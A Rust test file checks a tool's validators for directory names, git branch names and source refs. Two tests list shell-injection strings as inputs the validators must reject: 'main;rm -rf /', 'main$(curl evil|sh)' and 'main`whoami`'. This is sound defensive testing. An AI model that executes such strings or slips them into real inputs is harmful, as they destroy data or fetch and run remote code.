use wisetree::utils::validation::{
    normalize_branch_name, validate_branch_name, validate_directory_name, validate_source_ref,
};

#[test]
fn directory_empty() {
    assert_eq!(
        validate_directory_name(""),
        Some("Directory name cannot be empty")
    );
    assert_eq!(
        validate_directory_name("   "),
        Some("Directory name cannot be empty")
    );
}

#[test]
fn directory_path_separators() {
    assert_eq!(
        validate_directory_name("a/b"),
        Some("Directory name cannot contain path separators")
    );
    assert_eq!(
        validate_directory_name("a\\b"),
        Some("Directory name cannot contain path separators")
    );
}

#[test]
fn directory_dot_or_dash_prefix() {
    assert_eq!(
        validate_directory_name(".hidden"),
        Some("Directory name cannot start with . or -")
    );
    assert_eq!(
        validate_directory_name("-flag"),
        Some("Directory name cannot start with . or -")
    );
}

#[test]
fn directory_invalid_chars() {
    for c in ['<', '>', ':', '"', '|', '?', '*'] {
        let n = format!("foo{c}bar");
        assert_eq!(
            validate_directory_name(&n),
            Some("Directory name contains invalid characters"),
            "expected {n} rejected"
        );
    }
}

#[test]
fn directory_control_chars() {
    let n = format!("foo{}bar", char::from(0x01));
    assert_eq!(
        validate_directory_name(&n),
        Some("Directory name contains invalid characters")
    );
}

#[test]
fn directory_too_long() {
    let n = "a".repeat(256);
    assert_eq!(validate_directory_name(&n), Some("Directory name too long"));
}

#[test]
fn directory_valid() {
    assert_eq!(validate_directory_name("feature-foo"), None);
    assert_eq!(validate_directory_name("foo_bar.baz"), None);
}

#[test]
fn branch_empty() {
    assert_eq!(
        validate_branch_name(""),
        Some("Branch name cannot be empty")
    );
}

#[test]
fn branch_dotdot_or_double_slash() {
    assert_eq!(
        validate_branch_name("foo..bar"),
        Some("Branch name cannot contain .. or //")
    );
    assert_eq!(
        validate_branch_name("foo//bar"),
        Some("Branch name cannot contain .. or //")
    );
}

#[test]
fn branch_slash_edges() {
    assert_eq!(
        validate_branch_name("/foo"),
        Some("Branch name cannot start or end with /")
    );
    assert_eq!(
        validate_branch_name("foo/"),
        Some("Branch name cannot start or end with /")
    );
}

#[test]
fn branch_dash_or_dot_edges() {
    assert_eq!(
        validate_branch_name("-foo"),
        Some("Branch name cannot start with - or end with .")
    );
    assert_eq!(
        validate_branch_name("foo."),
        Some("Branch name cannot start with - or end with .")
    );
}

#[test]
fn branch_invalid_chars() {
    for s in [
        "foo bar", "foo~bar", "foo^bar", "foo:bar", "foo?bar", "foo*bar", "foo[bar", "foo]bar",
        "foo\\bar", "foo@bar",
    ] {
        assert_eq!(
            validate_branch_name(s),
            Some("Branch name contains invalid characters"),
            "expected {s} rejected"
        );
    }
}

#[test]
fn branch_rejects_shell_metacharacters() {
    for s in [
        "main;rm -rf /",
        "main$(curl evil|sh)",
        "main`whoami`",
        "main&background",
        "main|pipe",
        "main\"quote",
        "main'quote",
        "main{brace}",
        "main!bang",
        "main\nnewline",
    ] {
        assert_eq!(
            validate_branch_name(s),
            Some("Branch name contains invalid characters"),
            "expected {s:?} rejected"
        );
    }
}

#[test]
fn source_ref_accepts_remote_tag_and_sha() {
    assert_eq!(validate_source_ref("origin/main"), None);
    assert_eq!(validate_source_ref("v1.0.0"), None);
    assert_eq!(validate_source_ref("abc123f"), None);
    assert_eq!(validate_source_ref("HEAD"), None);
}

#[test]
fn source_ref_rejects_shell_metacharacters() {
    for s in [
        "main$(curl evil|sh)",
        "main;rm -rf /",
        "main`whoami`",
        "main|x",
        "main\nfoo",
    ] {
        assert_eq!(
            validate_source_ref(s),
            Some("Ref contains invalid characters"),
            "expected {s:?} rejected"
        );
    }
}

#[test]
fn source_ref_rejects_empty_and_leading_dash() {
    assert_eq!(validate_source_ref(""), Some("Ref cannot be empty"));
    assert_eq!(validate_source_ref("-foo"), Some("Ref cannot start with -"));
}

#[test]
fn branch_head_rejected() {
    assert_eq!(
        validate_branch_name("HEAD"),
        Some("Branch name cannot be HEAD")
    );
}

#[test]
fn branch_valid() {
    assert_eq!(validate_branch_name("feature/foo"), None);
    assert_eq!(validate_branch_name("release-1.2.x"), None);
    assert_eq!(validate_branch_name("main"), None);
}

#[test]
fn normalize_branch_name_trims_and_collapses_whitespace() {
    assert_eq!(normalize_branch_name(" foo bar "), "foo_bar");
    assert_eq!(normalize_branch_name("foo    bar"), "foo_bar");
    assert_eq!(normalize_branch_name("foo\tbar\nbaz"), "foo_bar_baz");
    assert_eq!(normalize_branch_name("   "), "");
    assert_eq!(
        validate_branch_name(&normalize_branch_name("   ")),
        Some("Branch name cannot be empty")
    );
}
